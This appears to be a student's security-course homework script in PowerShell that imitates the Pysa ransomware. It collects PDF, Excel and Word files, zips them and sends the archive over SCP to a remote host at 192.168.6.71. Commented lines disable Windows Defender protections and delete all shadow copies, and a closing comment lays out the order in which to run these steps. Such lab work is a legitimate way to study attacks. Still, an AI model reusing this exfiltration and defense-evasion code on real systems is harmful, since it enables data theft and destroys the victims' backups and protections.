#Disable Windows Defender
#Write-Host Set-MpPreference -DisableRealtimeMonitoring $true
#Write-Host Set-MpPreference -EnableControlledFolderAccess Disabled

#delete shadow copies
#write-host vssadmin delete shadows /all

Get-ChildItem -Recurse -Include *.pdf, *.xlsx, *.docx -Path .\Week14\Homework\Documents `
|Export-Csv -Path .\Week14\Homework\files.csv


#Import CSV
$filelist = Import-Csv -Path .\Week14\Homework\files.csv -Header FullName

#make Secret Docs folder 
mkdir .\Sec_Docs\

# Loop through the Secret Docs

foreach ($f in $fileList) {
    
    #Copy files over Sec_Docs
    Copy-Item $f.FullName -Destination .\Sec_Docs
}

# Compress Documents into Documents zip
Compress-Archive -Path .\Sec_Docs -DestinationPath .\Documents.zip

# Copy Documents zip over ssh
Set-SCPItem -ComputerName '192.168.6.71' -Credential (Get-Credential david.thomsen) -Port '2222' `
-Destination '/home/david.thomsen' -Path './Documents.zip'

#Remove-Item .\Sec_Docs -Force -Recurse
#Remove-Item .\Documents.zip
#Remove-Item .\files.csv



<#
Windows Defender is a built in Windows feature that protects 
users from malicious scripts or programs by blocking unauthorized access to files or applications. 

Pysa could trigger Controlled Folder Access if it attempts to access a file or folder that is not authorized for access. 
For example, if Pysa attempts to access an administrator-level folder or a folder in the system directory, then Defender Controlled Folder Access will trigger an alert and block the action.

I would put the Windows defender CMDlet first so that it is shut off for future usages, then deleting the shadows, and after running the mallicious code as well as copying the files.
(as seen above)
#>

